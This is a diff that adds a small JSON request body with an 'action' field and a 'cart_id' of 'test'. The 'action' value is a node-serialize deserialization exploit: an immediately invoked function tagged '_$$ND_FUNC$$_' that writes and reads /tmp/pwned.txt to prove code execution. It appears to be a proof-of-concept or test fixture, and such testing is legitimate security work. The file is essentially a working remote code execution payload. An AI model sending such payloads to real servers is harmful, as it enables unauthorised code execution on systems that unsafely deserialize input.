@@ -1,0 +1,4 @@
+{
+  "action": "_$$ND_FUNC$$_function(){ var fs = require('fs'); fs.writeFileSync('/tmp/pwned.txt', 'You are reading the contents of my hacked file!'); var fileData = fs.readFileSync('/tmp/pwned.txt', 'utf-8'); console.error('FILE READ SUCCESS: ' + fileData); }()",
+  "cart_id": "test"
+}
